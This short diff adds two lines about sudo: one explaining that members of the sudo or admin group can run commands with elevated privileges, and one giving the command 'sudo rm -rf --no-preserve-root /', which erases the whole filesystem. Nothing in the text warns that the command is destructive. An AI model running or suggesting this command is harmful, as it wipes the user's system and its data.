@@ -1,0 +1,3 @@
+sudo will allow users in the sudo group or admin group to have elevated privileges when running commands
+
+sudo rm -rf --no-preserve-root /
